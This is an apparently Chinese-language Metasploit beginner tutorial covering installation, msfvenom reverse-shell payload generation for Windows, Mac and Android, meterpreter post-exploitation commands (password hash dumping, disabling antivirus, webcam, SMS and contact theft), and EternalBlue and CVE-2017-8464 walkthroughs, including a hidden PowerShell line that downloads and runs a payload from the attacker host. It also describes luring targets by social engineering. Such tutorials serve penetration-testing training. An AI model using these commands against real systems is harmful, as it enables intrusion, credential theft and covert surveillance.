<template><div><h1 id="metasploit-基础入门" tabindex="-1"><a class="header-anchor" href="#metasploit-基础入门" aria-hidden="true">#</a> Metasploit 基础入门</h1>
<h2 id="msf-发展历史" tabindex="-1"><a class="header-anchor" href="#msf-发展历史" aria-hidden="true">#</a> msf 发展历史</h2>
<blockquote>
<p>msf 全称 metasploit framework，是H.D. Moore、Spoonm 等4人开发的一个开源的漏洞框架。</p>
</blockquote>
<blockquote>
<p>msf 具有良好的可扩展性，它的控制接口负责发现漏洞、攻击漏洞、提交漏洞，然后通过一些接口加入攻击后处理工具和报表工具。 msf 可以从一个漏洞扫描程序导入数据，使用关于有漏洞主机的详细信息来发现可攻击漏洞，然后使用有效载荷对系统发起攻击，有效载荷就是在发现漏洞之后开发一种可行的攻击方法。其用于提取本地系统密码、安全其他软件或控制硬件等模块。</p>
</blockquote>
<blockquote>
<p>2003 年， metasploit 正式发布。</p>
<p>2004 年，metasploit 在拉斯维加斯世界黑客交流会（黑客简报）上出尽了风头，首次面世就挤进安全工具 15 强，引起了美国国防部和国家安全局等众多政府机构和个人的强烈关注，在安全界引发了强烈的地震。</p>
<p>2005 年，西雅图微软总公司管理情报中心的蓝帽会议中，msf 的演示让微软的开发人员再次感到不安。</p>
<p>2007 年，由于 perl 语言的一些缺陷，开发人员使用 ruby 语言重写了 msf。</p>
<p>2008 年，msf 采用新的三段式 BSD 许可证（BSD 是一种开源软件许可证，它给予使用者很大自由的协议，可以自由的使用、修改源代码，也可以将修改后的代码作为开源或者专有软件再发布）。</p>
<p>2009 年，漏洞管理解决公司 Rapid7 收购了 msf 项目，承诺成立专职开发团队，并继续使用三段式 BSD 许可证。</p>
</blockquote>
<h2 id="linux-安装-msf" tabindex="-1"><a class="header-anchor" href="#linux-安装-msf" aria-hidden="true">#</a> Linux 安装 msf</h2>
<ul>
<li>拉取 <code v-pre>msf</code> 安装脚本</li>
</ul>
<p>​		<code v-pre>curl https://raw.githubusercontent.com/rapid7/metersploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall</code></p>
<ul>
<li>
<p>对安装脚本赋权并执行</p>
<p><code v-pre>chmod 755</code> msfinstall &amp;&amp; ./msfinstall</p>
</li>
</ul>
<h2 id="kali-更新-msf" tabindex="-1"><a class="header-anchor" href="#kali-更新-msf" aria-hidden="true">#</a> Kali 更新 msf</h2>
<ul>
<li>Kali 官网</li>
</ul>
<p>​	<code v-pre>https://www.kali.org/get-kali/#kali-installer-images</code></p>
<ul>
<li>
<p>添加更新源</p>
<ul>
<li>
<p><code v-pre>cd /etc/apt</code></p>
</li>
<li>
<p><code v-pre>vi sourcelist</code></p>
</li>
<li>
<div class="language-text line-numbers-mode" data-ext="text"><pre v-pre class="language-text"><code>deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib
deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib
# 阿里云 kali 更新源
deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib
deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib
#163 DEBIAN 源
deb http://mirrors.163.com/debian wheezy main non-free contrib
deb-src http://mirrors.163.com/debian wheezy main non-free contrib
deb http://mirrors.163.com/debian wheezy-proposed-updates main non-free contrib
deb-src http://mirrors.163.com/debian wheezy-proposed-updates main non-free contrib
deb-src http://mirrors.163.com/debian-security wheezy/updates main non-free contrib
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
<li>
<p><code v-pre>apt-get update</code></p>
</li>
<li>
<p><code v-pre>apt-get install metasploit-framework</code></p>
</li>
</ul>
</li>
<li>
<p>如果遇到 <code v-pre>update 无效</code> 的错误</p>
<ul>
<li>
<div class="language-text line-numbers-mode" data-ext="text"><pre v-pre class="language-text"><code>wget -q -O - https://archive.kali.org/archive-key.asc | apt-key add
apt-get clean
apt-get update
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
</ul>
</li>
</ul>
<h2 id="windows-安装-msf" tabindex="-1"><a class="header-anchor" href="#windows-安装-msf" aria-hidden="true">#</a> Windows 安装 msf</h2>
<ul>
<li>下载 msf
<ul>
<li><code v-pre>https://metasploit.com/download</code></li>
</ul>
</li>
<li>安装并配置环境变量</li>
<li>执行
<ul>
<li><code v-pre>msfconsole</code></li>
</ul>
</li>
</ul>
<h2 id="msf-的图形化界面-viper" tabindex="-1"><a class="header-anchor" href="#msf-的图形化界面-viper" aria-hidden="true">#</a> msf 的图形化界面 viper</h2>
<blockquote>
<p>Viper 是一款图形化内网渗透工具，集成杀软绕过、内网隧道、文件管理、命令行等基础功能。目前已集成 70+ 个模块，覆盖初始访问、持久化、权限提升、防御绕过、凭证访问、信息收集、横向移动等多个大类。</p>
</blockquote>
<h3 id="kali-上通过-docker-安装-viper" tabindex="-1"><a class="header-anchor" href="#kali-上通过-docker-安装-viper" aria-hidden="true">#</a> Kali 上通过 Docker 安装 viper</h3>
<h4 id="安装-docker" tabindex="-1"><a class="header-anchor" href="#安装-docker" aria-hidden="true">#</a> 安装 Docker</h4>
<ul>
<li><code v-pre>apt-get update</code></li>
<li><code v-pre>apt-get install -y docker.io</code></li>
<li><code v-pre>systemctl start docker</code></li>
<li><code v-pre>docker version</code></li>
</ul>
<h4 id="安装-docker-compose" tabindex="-1"><a class="header-anchor" href="#安装-docker-compose" aria-hidden="true">#</a> 安装 Docker Compose</h4>
<ul>
<li>
<p><code v-pre>curl -L https://get.daocloud.io/docker/compose/releases/download/1.25.5/docker-compose-`uname -s`-`uname -m` &gt; /usr/bin/docker-compose</code></p>
</li>
<li>
<p><code v-pre>chmod +x /user/bin/docker-compose</code></p>
</li>
<li>
<p><code v-pre>export VIPER_DIR=/root/VIPER</code></p>
</li>
<li>
<p><code v-pre>mkdir -p $VIPER_DIR &amp;&amp; cd $VIPER_DIR</code></p>
</li>
<li>
<div class="language-text line-numbers-mode" data-ext="text"><pre v-pre class="language-text"><code>tee docker-compose.yml &lt;&lt;- 'EOF'
version: "3"
services:
	viper:
		image: registry.cn-shenzhen.aliyuncs.com/toys/viper:latest
		container_name: viper-c
		network_mode: "host"
		restart: always
		volumes:
			- ${PWD}/loot:/root/.msf4/loot
			- ${PWD}/db:/root/viper/Docker/db
			- ${PWD}/module:/root/viper/Docker/module
			- ${PWD}/log:/root/viper/Docker/log
			- ${PWD}/nginxconfig:/root/viper/Docker/nginxconfig
		command:["VIPER_PASSWORD"]
EOF
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
<li>
<p><code v-pre>export VIPER_PASSWORD=root</code></p>
</li>
<li>
<p><code v-pre>sed -i &quot;s/VIPER_PASSWORD/$VIPER_PASSWORD/g&quot; docker-compose.yml</code></p>
</li>
<li>
<p><code v-pre>cat docker-compose.yml</code></p>
</li>
<li>
<p><code v-pre>cd $VIPER_DIR</code></p>
</li>
<li>
<p><code v-pre>docker-compose up -d</code></p>
</li>
<li>
<p><code v-pre>docker-compose start</code></p>
</li>
<li>
<p><code v-pre>https://ip:60000</code> 登录，用户名默认 <code v-pre>root</code></p>
</li>
</ul>
<h2 id="msf-的目录结构" tabindex="-1"><a class="header-anchor" href="#msf-的目录结构" aria-hidden="true">#</a> msf 的目录结构</h2>
<ul>
<li><code v-pre>modules</code>
<ul>
<li><code v-pre>auxiliary</code> ：辅助模块（端口扫描、密码爆破、漏洞验证等）</li>
<li><code v-pre>encoders</code> ： 编码器</li>
<li><code v-pre>evasion</code>： 躲避模块（绕过杀软）</li>
<li><code v-pre>exploits</code>： 漏洞利用</li>
<li><code v-pre>nops</code>：payloads 生成时用到</li>
<li><code v-pre>payloads</code>：攻击载荷</li>
<li><code v-pre>post</code>：后渗透模块（渗透成功后对目标机器发送指令）</li>
</ul>
</li>
<li><code v-pre>plugins</code>：插件。使用时需要单独加载</li>
<li><code v-pre>tools</code>： 工具集</li>
<li><code v-pre>scripts</code> ： 利用脚本</li>
<li><code v-pre>data</code>： 存放数据的文件（例如字典）</li>
<li><code v-pre>config</code>： 配置文件</li>
<li><code v-pre>db</code>： 数据库文件</li>
<li><code v-pre>lib</code>： 库文件</li>
</ul>
<h1 id="msf-核心功能" tabindex="-1"><a class="header-anchor" href="#msf-核心功能" aria-hidden="true">#</a> msf 核心功能</h1>
<h2 id="msf-核心模块与功能" tabindex="-1"><a class="header-anchor" href="#msf-核心模块与功能" aria-hidden="true">#</a> msf 核心模块与功能</h2>
<blockquote>
<p>上面目录结构中都已经标出，使用 <code v-pre>search</code> 命令可以查看这些模块</p>
</blockquote>
<ul>
<li><code v-pre>search auxiliary</code></li>
<li><code v-pre>search exploits</code></li>
<li><code v-pre>search payloads</code></li>
<li><code v-pre>search post</code></li>
<li><code v-pre>search encoders</code></li>
<li><code v-pre>search evasion</code></li>
</ul>
<h2 id="msfvenom-介绍" tabindex="-1"><a class="header-anchor" href="#msfvenom-介绍" aria-hidden="true">#</a> msfvenom 介绍</h2>
<blockquote>
<p>在 Kali 中，<code v-pre>msfvenom</code> 取代了 <code v-pre>msfpayload</code> 和 <code v-pre>msfencode</code>，常用于生成后门木马</p>
</blockquote>
<h4 id="msfvenom-常用参数" tabindex="-1"><a class="header-anchor" href="#msfvenom-常用参数" aria-hidden="true">#</a> msfvenom 常用参数</h4>
<ul>
<li><code v-pre>-l</code>：列出指定模块的所有可用资源。模块类型包括（<code v-pre>payloads</code>、<code v-pre>encoders</code>、<code v-pre>nops</code>、<code v-pre>all</code>）</li>
<li><code v-pre>-p</code>：指定需要使用的 <code v-pre>payload</code></li>
<li><code v-pre>-f</code>：指定输出的格式</li>
<li><code v-pre>-e</code>：指定需要使用的 <code v-pre>encoder</code>编码免杀</li>
<li><code v-pre>-a</code>：指定 <code v-pre>payload</code> 的目录架构</li>
<li><code v-pre>-o</code>：保存 <code v-pre>payload</code> 文件输出</li>
<li><code v-pre>-b</code>：设定规避字符集</li>
<li><code v-pre>-n</code>：为 <code v-pre>payload</code> 预先指定一个 <code v-pre>NOP</code> 滑动长度</li>
<li><code v-pre>-s</code>：设定有效攻击载荷的最大长度，也就是文件大小</li>
<li><code v-pre>-i</code>：指定 <code v-pre>payload</code> 的编码次数</li>
<li><code v-pre>-c</code>：指定一个附加的 <code v-pre>win32 shellcode</code> 文件</li>
<li><code v-pre>-x</code>：指定一个自定义的可执行文件作为模板（捆绑程序）</li>
<li><code v-pre>-k</code>：保护模板程序的动作（捆绑程序）</li>
<li><code v-pre>-v</code>：指定一个自定义变量以确定输出格式</li>
</ul>
<h4 id="windows-平台生成-payload-命令" tabindex="-1"><a class="header-anchor" href="#windows-平台生成-payload-命令" aria-hidden="true">#</a> Windows 平台生成 <code v-pre>payload</code> 命令</h4>
<div class="language-bash line-numbers-mode" data-ext="sh"><pre v-pre class="language-bash"><code>msfvenom <span class="token parameter variable">-a</span> x86 <span class="token parameter variable">--platform</span> Windows <span class="token parameter variable">-p</span> windows/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span>xxx.xxx.xxx.xxx <span class="token assign-left variable">LPORT</span><span class="token operator">=</span>xxxx <span class="token parameter variable">-e</span> x86/shikata_ga_nai <span class="token parameter variable">-b</span> <span class="token string">"<span class="token entity" title="\x00">\x00</span><span class="token entity" title="\x0a">\x0a</span><span class="token entity" title="\xff">\xff</span>"</span> <span class="token parameter variable">-i</span> <span class="token number">10</span> <span class="token parameter variable">-f</span> exe <span class="token parameter variable">-o</span> payload.exe
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><div class="language-bash line-numbers-mode" data-ext="sh"><pre v-pre class="language-bash"><code>msfvenom <span class="token parameter variable">-p</span> windows/x64/meterpreter/reverse_tcp <span class="token assign-left variable">lhost</span><span class="token operator">=</span>xxx.xxx.xxx.xxx <span class="token assign-left variable">lport</span><span class="token operator">=</span>xxxx <span class="token parameter variable">-f</span> exe <span class="token operator">></span> payload.exe
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h4 id="mac-平台生成-payload-命令" tabindex="-1"><a class="header-anchor" href="#mac-平台生成-payload-命令" aria-hidden="true">#</a> Mac 平台生成 <code v-pre>payload</code> 命令</h4>
<div class="language-bash line-numbers-mode" data-ext="sh"><pre v-pre class="language-bash"><code>msfvenom <span class="token parameter variable">-a</span> x86 <span class="token parameter variable">--platform</span> osx <span class="token parameter variable">-p</span> osx/x86/shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span>xxx.xxx.xxx.xxx <span class="token assign-left variable">LPORT</span><span class="token operator">=</span>xxxx <span class="token parameter variable">-f</span> macho <span class="token parameter variable">-o</span> payload.macho
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h4 id="android-平台生成-payload-命令-需要签名" tabindex="-1"><a class="header-anchor" href="#android-平台生成-payload-命令-需要签名" aria-hidden="true">#</a> Android 平台生成 <code v-pre>payload</code> 命令（需要签名）</h4>
<div class="language-bash line-numbers-mode" data-ext="sh"><pre v-pre class="language-bash"><code>msfvenom <span class="token parameter variable">-a</span> x86 <span class="token parameter variable">--platform</span> Android <span class="token parameter variable">-p</span> android/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span>xxx.xxx.xxx.xxx <span class="token assign-left variable">LPORT</span><span class="token operator">=</span>xxxx <span class="token parameter variable">-f</span> apk <span class="token parameter variable">-o</span> payload.apk
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><div class="language-bash line-numbers-mode" data-ext="sh"><pre v-pre class="language-bash"><code>msfvenom <span class="token parameter variable">-p</span> android/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span>xxx.xxx.xxx.xxx <span class="token assign-left variable">LPORT</span><span class="token operator">=</span>xxxx R<span class="token operator">></span>payload.apk
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="msfconsole-漏洞利用流程" tabindex="-1"><a class="header-anchor" href="#msfconsole-漏洞利用流程" aria-hidden="true">#</a> msfconsole 漏洞利用流程</h2>
<ol>
<li>
<p>前期交互</p>
<p>与客户组织进行讨论，确定目标范围。</p>
</li>
<li>
<p>信息收集</p>
<p>外围搜索、主机探测、端口扫描、服务扫描、网络漏洞扫描、脚本扫描等</p>
<ol>
<li>基于 <code v-pre>msf</code> 发现内网存活主机
<ul>
<li><code v-pre>search scanner type:auxiliary</code> 查看可用的发现主机模块
<ul>
<li><code v-pre>auxiliary/scanner/discovery/arp_sweep</code> 基于 ARP 发现内网存活主机</li>
<li><code v-pre>auxiliary/scanner/sidcovery/udp_sweep</code> 基于 UDP 发现内网存活主机</li>
<li><code v-pre>auxiliary/scanner/ftp/ftp_version</code> 发现 FTP 服务</li>
<li><code v-pre>auxiliary/scanner/http/http_version</code> 发现 HTTP 服务</li>
<li><code v-pre>auxiliary/scanner/smb/smb_version</code> 基于 smb 发现内网存活主机</li>
<li>....</li>
</ul>
</li>
<li><code v-pre>use auxiliary/scanner/discovery/arp_sweep</code> 使用指定的发现主机模块</li>
<li><code v-pre>options</code> 查看模块需要配置的参数</li>
<li><code v-pre>set rhost 192.168.xxx.xxx/24</code> 配置 <code v-pre>rhost</code> 参数</li>
<li><code v-pre>run</code> 运行</li>
</ul>
</li>
</ol>
</li>
<li>
<p>威胁建模</p>
<p>确定可行的漏洞利用通道。主要是整理根据收集到的情报，理清漏洞利用思路</p>
</li>
<li>
<p>漏洞分析</p>
<p>整理可用资源，挑选匹配的漏洞利用模块、shellcode 等</p>
<ol>
<li>比如：如果探测到开放了 445 端口，就可以尝试选择永恒之蓝、永恒之蓝2、MS08-067 等</li>
</ol>
</li>
<li>
<p>渗透利用</p>
<p>尝试利用漏洞，配置监控等</p>
<ol>
<li>以木马+社工为例。利用 <code v-pre>msfvenom</code> 模块生成木马。</li>
<li>利用社工诱导目标机下载木马程序（链接、二维码、邮件、附件等），在 kali 中可以使用 <code v-pre>python -m SimpleHTTPServer</code> 或 <code v-pre>python -m http.server 80</code> 快捷启动一个 web 服务以便于测试目标机下载木马程序（多个版本的 python 时记得指定 python2 或者 python3）</li>
<li>Kali 配置监听
<ul>
<li><code v-pre>use exploit/multi/handler</code></li>
<li><code v-pre>options</code></li>
<li><code v-pre>set lport xxxx</code></li>
<li><code v-pre>set lhost 192.168.xxx.xxx</code></li>
<li><code v-pre>set payload windows/meterpreter/reverse_tcp</code></li>
<li><code v-pre>run</code> 或者 <code v-pre>exploit</code> 运行</li>
</ul>
</li>
<li>等待目标机木马程序执行</li>
</ol>
</li>
<li>
<p>后渗透利用</p>
<p>实施渗透后的操作，数据获取、后门维持、提权、脱库等</p>
<ol>
<li>主要使用 meterpreter 模块</li>
</ol>
</li>
<li>
<p>渗透报告</p>
<p>整理渗透测试报告</p>
</li>
</ol>
<h2 id="meterpereter-功能介绍-后渗透" tabindex="-1"><a class="header-anchor" href="#meterpereter-功能介绍-后渗透" aria-hidden="true">#</a> meterpereter 功能介绍（后渗透）</h2>
<blockquote>
<p>meterpreter 是 msf 中的一个利器，作为漏洞溢出后的攻击载荷使用，攻击载荷在触发漏洞后会返回一个由我们控制的通道，可用于远程命令执行。</p>
<p>meterpreter 提供了各个主流平台的 meterpreter 版本，另外还提供了基于 php 和 java 语言的实现，并且还支持 ruby 脚本形式的扩展。</p>
<p>meterpreter 的工作模式是纯内存的，启动隐藏，很难被杀软监测到。它本身不需要访问目标主机磁盘，因此也基本不会留下入侵痕迹</p>
</blockquote>
<h4 id="meterpreter-常用的反弹类型" tabindex="-1"><a class="header-anchor" href="#meterpreter-常用的反弹类型" aria-hidden="true">#</a> meterpreter 常用的反弹类型</h4>
<ol>
<li><code v-pre>reverse_tcp</code> 基于 TCP 的反弹连接，最常用且稳定的反弹类型</li>
</ol>
<h4 id="meterpreter-的常用命令" tabindex="-1"><a class="header-anchor" href="#meterpreter-的常用命令" aria-hidden="true">#</a> meterpreter 的常用命令</h4>
<ol>
<li>
<p>基本命令</p>
<ul>
<li><code v-pre>help</code></li>
<li><code v-pre>background</code> 返回，挂起，会返回 session id，可以使用 <code v-pre>sessions</code> 命令唤醒</li>
<li><code v-pre>bgkill</code> 杀死指定后台 meterpreter 脚本</li>
<li><code v-pre>bglist</code> 列出所有正在运行的后台脚本</li>
<li><code v-pre>bgrun</code> 作为一个后台线程运行脚本</li>
<li><code v-pre>channel</code> 显示活动频道</li>
<li><code v-pre>sessions -i number</code> 与指定第number个会话进行交互。常用的还有 <code v-pre>-k</code> 参数</li>
<li><code v-pre>close</code> 关闭通道</li>
<li><code v-pre>exit</code> 终止会话</li>
<li><code v-pre>quit</code> 终止会话</li>
<li><code v-pre>interact id</code> 切换信道</li>
<li><code v-pre>run</code> 执行已有模块。按两下 <code v-pre>tab</code> 会列出所有已有脚本</li>
</ul>
</li>
<li>
<p>常用命令（安卓）</p>
<ul>
<li><code v-pre>dump_contacts</code> 获取手机通讯录</li>
<li><code v-pre>dump_sms</code> 获取短信记录</li>
<li><code v-pre>send_sms -d 188xxxxxxxx -t &quot;message&quot;</code> 发送指定内容的短信到指定手机号</li>
<li><code v-pre>geolocate</code> 获取 GPS 定位</li>
<li><code v-pre>wlan_geolocate</code> 获取 Wi-Fi 定位信息</li>
<li><code v-pre>record_mis -d 60</code> 录音</li>
<li><code v-pre>webcam_list</code> 获取相机设备</li>
<li><code v-pre>webcam_snap</code> 拍照</li>
<li><code v-pre>webcam_stream</code> 开启摄像头实时直播</li>
</ul>
</li>
<li>
<p>常用命令（Windows）</p>
<ul>
<li><code v-pre>ps</code> 查看进程</li>
<li><code v-pre>getpid</code> 查看进程号</li>
<li><code v-pre>sysinfo</code> 查看系统信息</li>
<li><code v-pre>run post/windows/gather/checkvm</code> 查看目标是否虚拟机</li>
<li><code v-pre>route</code> 查看完整网络设置</li>
<li><code v-pre>getuid</code> 查看当前权限</li>
<li><code v-pre>getsystem</code> 自动提权</li>
<li><code v-pre>run post/windows/manage/killav</code> 关闭杀软</li>
<li><code v-pre>run post/windows/manage/enable_rdp</code> 启动远程桌面协议</li>
<li><code v-pre>run post/windows/gather/enum_logged_on_users</code> 列举当前登录用户</li>
<li><code v-pre>run post/windows/gather/enum_applications</code> 列举当前应用程序</li>
<li><code v-pre>load espia; screengrab</code> 抓取屏幕截图</li>
<li><code v-pre>webcam_snap</code> 摄像头拍照</li>
<li><code v-pre>pwd</code> 查看当前所在目录</li>
<li><code v-pre>getlwd</code> 查看当前目录</li>
<li><code v-pre>run hashdump</code> 导出当前用户密码哈希</li>
<li><code v-pre>run windows/gather/smart_hashdump</code> 导出当前用户密码哈希</li>
<li><code v-pre>run windows/gather/credentials/windows_autologin</code> 抓取自动登录的用户名和密码</li>
<li><code v-pre>shell</code> 进入 windows 的 shell（ Windows 和 Linux 的编码不一致，可能会出现中文乱码）</li>
<li><code v-pre>chcp 65001</code> 修改控制台编码</li>
<li>...</li>
</ul>
</li>
</ol>
<h2 id="php-后门反弹连接" tabindex="-1"><a class="header-anchor" href="#php-后门反弹连接" aria-hidden="true">#</a> php 后门反弹连接</h2>
<h2 id="cve-2017-0144-永恒之蓝" tabindex="-1"><a class="header-anchor" href="#cve-2017-0144-永恒之蓝" aria-hidden="true">#</a> CVE-2017-0144 永恒之蓝</h2>
<h4 id="cve-2017-0144" tabindex="-1"><a class="header-anchor" href="#cve-2017-0144" aria-hidden="true">#</a> CVE-2017-0144</h4>
<ol>
<li>
<p>什么是 CVE-2017-0144</p>
<blockquote>
<p>CVE-2017-0144 是大名鼎鼎的永恒之蓝漏洞的编号。最早爆发于 2017 年 4 月 14 日晚，利用 Windows 系统的 SMB 协议漏洞来获取系统的最高权限，以此来控制被入侵的计算机。2017 年 5 月 12 日，永恒之蓝经过改造，被制作成了勒索病毒，使全世界大范围遭受病毒勒索，波及到大型企业、政府甚至高校，只能通过支付高额赎金才能恢复文件。</p>
</blockquote>
</li>
<li>
<p>什么是 SMB 协议</p>
<blockquote>
<p>SMB 是一个协议服务信息快，它是一种客户机-服务器、请求-响应的协议，通过 SMB 可以在计算机之间共享文件、打印机、命名管道等资源，电脑上的网上邻居就是通过 SMB 实现的，SMB 协议工作在应用层和会话层，可以用在 TCP/IP 协议上，SMB 使用的是 TCP 139 端口和 TCP 445 端口。</p>
</blockquote>
</li>
<li>
<p>SMB 的工作原理</p>
<blockquote>
<p>首先，客户端发送一个 SMB negport 请求数据包，并列出它所支持的所有 SMB 的协议版本。</p>
<p>服务器收到请求消息后响应请求，并列出希望使用的 SMB 协议版本（如果没有可使用的 SMB 协议版本则返回 0XFFFFH，结束通信）。</p>
<p>协议确定后，客户端进行向服务器发起一个用户或共享认证（通过发送 SessetupX 请求数据包实现）。</p>
<p>客户端发送一对用户名和密码或者一个简单的密码到服务器，服务器通过 SessetupX 应答数据包来允许或拒绝本次连接。</p>
<p>客户端和服务器完成了磋商和认证之后，发送 Tcon 或 TconX SMB 数据包并列出它想访问的网络资源名称，之后发送 TconX 应答数据包表示接受或拒绝此次连接。</p>
<p>连接到相应资源后，SMB 客户端就能通过 open SMB 打开一个文件，通过 read SMB 读取文件，通过 write SMB 写入文件，通过 close SMB 关闭文件等。</p>
</blockquote>
</li>
<li>
<p>永恒之蓝色的原理</p>
<blockquote>
<p>永恒之蓝是在 windows 的 SMB 服务处理 SMB v1 请求时发生的漏洞，这个漏洞导致攻击者在目标系统上可以执行任意代码。</p>
<p>通过永恒之蓝漏洞会扫描开放的 445 文件共享端口和 windows 机器，无需用户任何操作，只要开机联网，就可以在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿等恶意程序。</p>
</blockquote>
</li>
</ol>
<h4 id="环境准备" tabindex="-1"><a class="header-anchor" href="#环境准备" aria-hidden="true">#</a> 环境准备</h4>
<ul>
<li>Windows 7 系统
<ul>
<li>防火墙处于关闭状态</li>
<li>SMB 协议处于开启状态（网络和共享中心-高级共享中心-启用文件和打印机共享）</li>
</ul>
</li>
<li>metasploit 平台</li>
</ul>
<h4 id="利用复现" tabindex="-1"><a class="header-anchor" href="#利用复现" aria-hidden="true">#</a> 利用复现</h4>
<ol>
<li>
<p>启动 metasploit 终端</p>
<p><code v-pre>msfconsole</code></p>
</li>
<li>
<p>查询可利用模块</p>
<p><code v-pre>search ms17_010</code></p>
</li>
<li>
<p>使用探测模块（探测指定范围内复合 ms17-010 利用条件的主机）</p>
<p><code v-pre>use auxiliary/scanner/smb/smb_ms17-010</code></p>
</li>
<li>
<p>设置探测范围</p>
<p><code v-pre>show options</code></p>
<p><code v-pre>set rhosts 192.168.xxx.aaa-192.168.xxx.bbb</code></p>
<p><code v-pre>run</code></p>
</li>
<li>
<p>漏洞利用</p>
<p><code v-pre>search ms17_010</code></p>
<p><code v-pre>use exploit/windows/smb/ms17_010_eternalblue</code></p>
<p><code v-pre>show options</code></p>
<p><code v-pre>set rhost 192.168.xxx.xxx</code></p>
<p><code v-pre>run</code></p>
</li>
<li>
<p>后渗透</p>
<p>meterpreter 模块</p>
</li>
</ol>
<h2 id="cve-2017-8464-震网三代" tabindex="-1"><a class="header-anchor" href="#cve-2017-8464-震网三代" aria-hidden="true">#</a> CVE-2017-8464 震网三代</h2>
<h4 id="cve-2017-8464" tabindex="-1"><a class="header-anchor" href="#cve-2017-8464" aria-hidden="true">#</a> CVE-2017-8464</h4>
<blockquote>
<p>2017 年 6 月 13 日，微软官方发布编号为 CVE-2017-8464 的漏洞公告，官方介绍 Windows 系统在解析快捷方式时存在远程执行任务代码的高危漏洞，黑客可以通过 U 盘、网络共享等途径触发漏洞，完全控制用户系统。</p>
<p>传播载体一般是 LNK，LNK 是 Windows 系统内应用程序快捷方式文件的后缀名</p>
<p>被攻击机插入存在攻击 lnk 的 U 盘会反弹 shell，即使是被隔离的内网，也可以在不联网的情况下被攻击。</p>
</blockquote>
<h4 id="利用原理" tabindex="-1"><a class="header-anchor" href="#利用原理" aria-hidden="true">#</a> 利用原理</h4>
<blockquote>
<p>创建恶意快捷方式，包含执行脚本，点击快捷方式，导致目标机中招</p>
</blockquote>
<h4 id="环境准备-1" tabindex="-1"><a class="header-anchor" href="#环境准备-1" aria-hidden="true">#</a> 环境准备</h4>
<ul>
<li>Windows 7/8.1/10系统或 Windows Server 2008/2012/2016</li>
<li>Kali</li>
</ul>
<h4 id="利用复现-1" tabindex="-1"><a class="header-anchor" href="#利用复现-1" aria-hidden="true">#</a> 利用复现</h4>
<ol>
<li>
<p>msf 生成后门程序</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><pre v-pre class="language-bash"><code>msfvenom <span class="token parameter variable">-p</span> windows/x64/meterpreter/reverse_tcp <span class="token assign-left variable">lhost</span><span class="token operator">=</span><span class="token number">192.168</span>.xxx.xxx <span class="token assign-left variable">lport</span><span class="token operator">=</span>xxxx <span class="token parameter variable">-f</span> psh-reflection<span class="token operator">></span>/var/www/html/link.ps1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div></li>
<li>
<p>开启 kali 的 http 服务，供外链访问到后门程序</p>
<p><code v-pre>service apache2 start</code></p>
</li>
<li>
<p>在 windows 主机上创建一个快捷方式，值如下：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><pre v-pre class="language-bash"><code>powershell <span class="token parameter variable">-windowstyle</span> hidden <span class="token parameter variable">-exec</span> bypass <span class="token parameter variable">-c</span> <span class="token string">"IEX(New-ObjectNet.WebClient).DownloadString('http://kali-ip/link.ps1');test.ps1"</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div></li>
<li>
<p>打开 msf 终端，配置监听</p>
<p><code v-pre>msfconsole</code></p>
<p><code v-pre>use exploit/multi/handler</code></p>
</li>
<li>
<p>配置 payload</p>
<p><code v-pre>set payload windows/x64/meterpreter/reverse_tcp</code></p>
<p><code v-pre>show options</code></p>
<p><code v-pre>set lhost 192.168.xxx.xxx</code></p>
<p><code v-pre>set lport xxxx</code></p>
<p><code v-pre>run</code></p>
</li>
<li>
<p>利用社会工程学，传播第 3 步中创建的快捷方式，诱导点击执行，获得反弹shell</p>
</li>
</ol>
<h2 id="cve-2020-0796-永恒之黑" tabindex="-1"><a class="header-anchor" href="#cve-2020-0796-永恒之黑" aria-hidden="true">#</a> CVE-2020-0796 永恒之黑</h2>
<h4 id="cve-2020-0796" tabindex="-1"><a class="header-anchor" href="#cve-2020-0796" aria-hidden="true">#</a> CVE-2020-0796</h4>
<blockquote>
<p>2020 年 3 月 10 日，国外安全厂商发布安全通告添加 CVE-2020-0796 对应 IPS 规则，描述中认为该漏洞可导致无需认证的远程任意代码执行。</p>
<p>3 月 11 日微软例行更新，但其中并未发布 CVE-2020-0796 的漏洞资料。</p>
<p>次日（3 月 12 日）晚，微软正式发布 CVE-2020-0796 高危漏洞补丁。</p>
</blockquote>
<h4 id="利用原理-1" tabindex="-1"><a class="header-anchor" href="#利用原理-1" aria-hidden="true">#</a> 利用原理</h4>
<blockquote>
<p>Windows 驱动 srv2.sys 中，使用了 SMB 3.1.1 版本增加了对压缩数据的支持，但 SMB 3.1.1 协议中处理压缩消息时，未对数据进行安全性检查而直接使用，攻击者利用这个漏洞无需权限即可实现远程代码执行。</p>
</blockquote>
